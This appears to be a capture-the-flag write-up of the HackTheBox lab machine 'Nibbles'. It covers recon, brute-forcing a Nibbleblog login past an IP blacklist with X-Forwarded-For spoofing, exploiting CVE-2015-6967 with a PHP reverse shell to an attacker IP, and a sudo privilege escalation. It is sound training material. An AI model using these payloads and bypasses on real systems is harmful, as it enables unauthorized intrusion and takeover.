---
render_with_liquid: false
title: HackTheBox Writeup  Nibbles
date: 2023-09-29 20:21:40 +1400
tags: [hackthebox, nmap, linux, feroxbuster, enum, nibbleblog, searchsploit, cve-2015-6967, 4xx-bypass, password-guessing, ffuf, custom-wordlist, cewl, hashcat-rules, faker, duplicut, php, file-upload, sudo, bash-script, oscp-like, hwatch, ssh-user-enum]
---



Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.


# Recon
---

## Nmap

```bash

# Nmap 7.94 scan initiated Fri Sep 29 20:21:40 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80 nibbles.htb
Nmap scan report for nibbles.htb (10.129.68.41)
Host is up, received user-set (0.063s latency).
Scanned at 2023-09-29 20:21:40 CST for 11s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Sep 29 20:21:51 2023 -- 1 IP address (1 host up) scanned in 11.36 seconds
```


## 80 - HTTP : Apache/2.4.18


### Info

![](/assets/obsidian/85428dd646e849ff9f4cae62214f391f.png)

```ruby
http://nibbles.htb [200] [] [Apache/2.4.18 (Ubuntu)] [Apache HTTP Server:2.4.18,Ubuntu] [d5372d31ce747f7a6bd8fea14f49e1336afcc3d0]
```

### Directory

```bash
feroxbuster -k -t 150 -u 'http://nibbles.htb' -o ferox_80.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ cat ferox_80.txt|awk '$1!=404'
200      GET       16l        9w       93c http://nibbles.htb/
```

# User Flag
---

## Shell as nibbler


### Discover a hidden directory

No hosts found from website, and no directories found. Should try CVE or take a look at source code

![](/assets/obsidian/803dbc14cbd27619bcf444116f6fb5c5.png)

> Fun fact : if attacker did not find the hidden directory from the source code, the wordlist [OneListForAll](https://github.com/six2dez/OneListForAll) will be able to brute force it
> 
> When it comes to really large wordlist, use **gobuster** instead of **feroxbuster** for stability and reliability
> ```bash
> gobuster dir -k -t 150 -e -u 'http://nibbles.htb' -w /opt/wordlists/OneListForAll/onelistforall.txt -o ferox_80_onelistforall.txt
> ```
{: .prompt-tip }


### Analyze Nibbleblog 4.0.3 - Arbitrary File Upload (CVE-2015-6967) exploit

> http://nibbles.htb/nibbleblog/

Looks like a CMS

![](/assets/obsidian/f9f43655f48dcce90336bb4b6e3de4df.png)

![](/assets/obsidian/6f179995d085bd45371c15bba4c8cbcd.png)

Found their github, last commit was from `2019`, very likely to be vulnerable

> https://github.com/dignajar/nibbleblog

![](/assets/obsidian/f7d7e62c83173c84386bdc5ebc0bde69.png)

![](/assets/obsidian/67e9224eebeee020bb5a168712ecaa74.png)

```bash
searchsploit nibbleblog
```

![](/assets/obsidian/f54a309fa2c0deb016cce3218b738895.png)

Let's try exploit it manually without **metasploit**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ searchsploit -m 38489
  Exploit: Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)
      URL: https://www.exploit-db.com/exploits/38489
     Path: /usr/share/exploitdb/exploits/php/remote/38489.rb
    Codes: CVE-2015-6967, OSVDB-127059
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /home/kali/htb/Nibbles/38489.rb


┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ vi 38489.rb
```

- It needs username and password, and the login endpoint is default to `/admin.php`

![](/assets/obsidian/c5c5267d241fe4fbb2c07eb9add3d44f.png)

- It will generate a `.php` payload with a random name and build a form to submit the file as a plugin

![](/assets/obsidian/eae1f6b140f63827bb195826cec7086a.png)

- Below is its post data of upload request

![](/assets/obsidian/7807f464d0ed2b14d22836d9f3bd9154.png)

- The uploaded php file will be at `/content/private/plugins/my_image/image.php`

![](/assets/obsidian/fb5575b4d6ea08bd912779101195b862.png)


### Exploit CVE-2015-6967 (manually)


#### Got blocked while trying to brute force login

> http://nibbles.htb/nibbleblog/admin.php

Tried some passwords like `admin`:`admin`, `admin`:`password`, all failed

Tried google : `Nibbleblog default password`, nothing we want

Start brute force common credentials

Capture the login request with burp and save to `login.req`

![](/assets/obsidian/dfc5a010e2be99fcf32a3530a37e5337.png)

Then change the password value to `FUZZ` - `username=admin&password=FUZZ`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ ffuf -c -request login.req -request-proto http -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -r -fs 48
```

I got blacklisted after a while

![](/assets/obsidian/6161e90432e5ab00a02ed35b41db73e5.png)


#### Find how the blacklist protection work

Start enumerating directories

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ feroxbuster -t 150 -u http://nibbles.htb/nibbleblog -r -n -o ferox_nibbleblog.txt -C 404

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://nibbles.htb/nibbleblog
 🚀  Threads               │ 150
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_nibbleblog.txt
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      305l     1646w    25081c http://nibbles.htb/nibbleblog/languages/ru_RU.bit
200      GET      326l     1740w    17135c http://nibbles.htb/nibbleblog/languages/en_US.bit
200      GET       63l      643w     4628c http://nibbles.htb/nibbleblog/README
200      GET       18l       82w     1353c http://nibbles.htb/nibbleblog/content/
200      GET        1l        6w       48c http://nibbles.htb/nibbleblog/
200      GET       20l      104w     1741c http://nibbles.htb/nibbleblog/themes/
200      GET      288l      905w    16495c http://nibbles.htb/nibbleblog/languages/zh_CN.bit
200      GET      288l     1575w    17763c http://nibbles.htb/nibbleblog/languages/de_DE.bit
200      GET      288l     2061w    18787c http://nibbles.htb/nibbleblog/languages/vi_VI.bit
200      GET      288l     1645w    18190c http://nibbles.htb/nibbleblog/languages/pl_PL.bit
200      GET      288l     1748w    17998c http://nibbles.htb/nibbleblog/languages/pt_PT.bit
200      GET       30l      214w     3777c http://nibbles.htb/nibbleblog/plugins/
200      GET      288l      921w    16627c http://nibbles.htb/nibbleblog/languages/zh_TW.bit
200      GET      288l     1942w    19170c http://nibbles.htb/nibbleblog/languages/fr_FR.bit
200      GET      288l     1797w    18351c http://nibbles.htb/nibbleblog/languages/it_IT.bit
200      GET      288l     1810w    18341c http://nibbles.htb/nibbleblog/languages/es_ES.bit
200      GET      287l     1754w    17569c http://nibbles.htb/nibbleblog/languages/nl_NL.bit
200      GET       27l      181w     3167c http://nibbles.htb/nibbleblog/languages/
200      GET       22l      126w     2127c http://nibbles.htb/nibbleblog/admin/
```

> http://nibbles.htb/nibbleblog/README

Confirmed its version is vulnerable

![](/assets/obsidian/76b80a2bedec7982bf9cf46d1334dd9c.png)

Found `config.xml` under the directory listings, but did not find anything really helpful

> http://nibbles.htb/nibbleblog/content/private/config.xml

![](/assets/obsidian/7bcf59f46350ffd4259e05ffa7b56db1.png)

Found `users.xml` with `fail_count` that stores blacklist info

> http://nibbles.htb/nibbleblog/content/private/users.xml

![](/assets/obsidian/d5dfdc90e2f25c8376940e066eae7cfd.png)


#### Fuzz header to bypass IP blacklist

Now I will fuzz some IP headers to check if I can bypass the blacklist

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ cp login.req login_bypass.req

┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ vi login_bypass.req
```

> `login_bypass.req`

```http
POST /nibbleblog/admin.php HTTP/1.1
Host: nibbles.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://nibbles.htb
Connection: close
Referer: http://nibbles.htb/nibbleblog/admin.php
Cookie: PHPSESSID=7hhg29abtivtrttjqnu82ic4f3
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
FUZZ: 127.0.0.1

username=admin&password=x
```

Monitor changes on the page via **hwatch**

```bash
hwatch -c -d -n 1 'curl -s http://nibbles.htb/nibbleblog/content/private/users.xml|xmllint --format -'
```

Start fuzzing (The payloads were from **[dontgo403](https://github.com/devploit/dontgo403)**)

```bash
ffuf -c -request login.req -request-proto http -w /opt/sectools/web/Bypasses/dontgo403/payloads/headers -r -fs 48
```

- `X-Forwarded-For` and `Client-IP` worked!

![](/assets/obsidian/238f07e6315b995057e570cad86680cd.png)

![](/assets/obsidian/392e1c29663927ca17f08f0635046745.png)


#### Generate custom password list via cewl and hashcat

Gather keywords from the blog page

```bash
cewl -d 5 -m 3 --with-numbers -w cewl_nibbleblog.txt http://nibbles.htb/nibbleblog/
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ cat cewl_nibbleblog.txt
Nibbles
Yum
yum
Hello
world
posts
Home
Uncategorised
Music
Videos
HEADER
MAIN
PLUGINS
Categories
Latest
image
Pages
VIEW
There
are
FOOTER
Atom
Top
Powered
Nibbleblog
ATOM
Feed
http
134
nibbleblog
feed
php
2023
30T09
```

Generate a wordlist with hashcat rules

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ hashcat --force --stdout cewl_nibbleblog.txt -r /usr/share/hashcat/rules/best64.rule > passwords_best64.txt
```

Then use **duplicut** to cleanup the wordlist

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ /opt/sectools/password-attacks/duplicut/duplicut -p passwords_best64.txt -o passwords_best64_duplicut.txt

duplicut successfully removed 366 duplicates and 33 filtered lines in 00 seconds
```

- `-p` : Filter out non-ascii characters

#### Generate random IP addresses to a wordlist

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ wc -l passwords_best64_duplicut.txt
2206 passwords_best64_duplicut.txt
```

We need `2206` random IPs to brute simultaneous with the passwords we generated

Though I can generate the IP addresses in real time and pipe to **ffuf**, but that will be very slow

Let's save them to a wordlist, I'll use **[faker](https://github.com/joke2k/faker)** python package to generate ip

> Faker is a Python package that generates fake data for you.

> `gen_ipv6.py`

```python
import sys
from faker import Faker


fake = Faker()
if len(sys.argv) != 2:
    print("Usage : python sys.argv[0] <lines_of_ipv6>")
    sys.exit(1)

count = int(sys.argv[1])
with open("rnd_ipv6.txt", "w") as f:
    f.writelines((f"{fake.ipv6()}\n" for _ in range(count)))
print(f"Wrote {count} ips to rnd_ipv6.txt")
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ python gen_ipv6.py 2206
Appended 2206 ips to rnd_ipv6.txt
```


#### Brute force via ffuf

> `login_blacklist_bypass.req`

```http
POST /nibbleblog/admin.php HTTP/1.1
Host: nibbles.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://nibbles.htb
X-Forwarded-For : FUZZ1
Connection: close
Referer: http://nibbles.htb/nibbleblog/admin.php
Cookie: PHPSESSID=7hhg29abtivtrttjqnu82ic4f3
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

username=admin&password=FUZZ2
```

- Use `pitchfork` mode instead of the default `clusterbomb` mode

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ ffuf -c -request login_blacklist_bypass.req -request-proto http -w ./rnd_ipv6.txt:FUZZ1 -w ./passwords_best64_duplicut.txt:FUZZ2 -r -fs 1541 -mode pitchfork
```

![](/assets/obsidian/9b81ff2cf24ef2873d86bdf32a2532db.png)

> Got password : `nibbles`
{: .prompt-tip }


#### Exploit

> **After login**
> I can see all those flailed login attempts, brute forcing should always be the last resort in real engagements
{: .prompt-warning }

![](/assets/obsidian/7a73191b883dc17e6398a13f0dc64450.png)

Check plugins

![](/assets/obsidian/402d011e5b2b49a9bce4d5428b2deace.png)

![](/assets/obsidian/4a2e2362101ac074e11c3677e624554f.png)

`My image` is the only plugin that allows user to upload files with no extension limits

![](/assets/obsidian/e00890a2950c181500d62a910829aa54.png)

Upload a php revshell

> `rev.php`

```php
<?php system("/bin/bash -c 'bash -i > /dev/tcp/10.10.16.13/1111 0>&1'"); ?>
```

Although it gave some errors, but the revshell still works

![](/assets/obsidian/b15597e2395d2387f94c6b01c5377d63.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ curl nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.13] from (UNKNOWN) [10.129.63.157] 59882
python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$

nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Nibbles]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

<ml/nibbleblog/content/private/plugins/my_image$ export TERM=xterm
<ml/nibbleblog/content/private/plugins/my_image$ stty rows 200 columns 200
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cat ~/user.txt
3df3ff4b6e491912073bb4ff2db25dae
```


# Root Flag
---

## From nibbler to root


### SUDO

```bash
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

```bash
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ls -l /home/nibbler/personal/stuff/monitor.sh
ls: cannot access '/home/nibbler/personal/stuff/monitor.sh': No such file or directory
```

```bash
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ echo -e '#!/bin/bash\nbash -p'>/home/nibbler/personal/stuff/monitor.sh
bash: /home/nibbler/personal/stuff/monitor.sh: No such file or directory

nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ mkdir -p /home/nibbler/personal/stuff/

nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ echo -e '#!/bin/bash\nbash -p'>/home/nibbler/personal/stuff/monitor.sh

nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ sudo /home/nibbler/personal/stuff/monitor.sh

root@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image# id
uid=0(root) gid=0(root) groups=0(root)
root@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image# cat /root/root.txt
d828b8afecc05002d5a8489e304ac44e
```


# Additional
---

## OpenSSH 2.3 < 7.7 - Username Enumeration (CVE-2018-15473)

Found this via **Nuclei** (Nmap vuln script scan won't find it)

![](/assets/obsidian/53a3818ef9930791c93e2553dad4ddf6.png)

> https://github.com/epi052/cve-2018-15473

Or use `scanner/ssh/ssh_enumusers` from **metasploit**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nibbles/cve-2018-15473]
└─$ python ssh-username-enum.py -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt nibbles.htb
```

![](/assets/obsidian/5e85c89e3fa40f2e6f4f9ac114dc0820.png)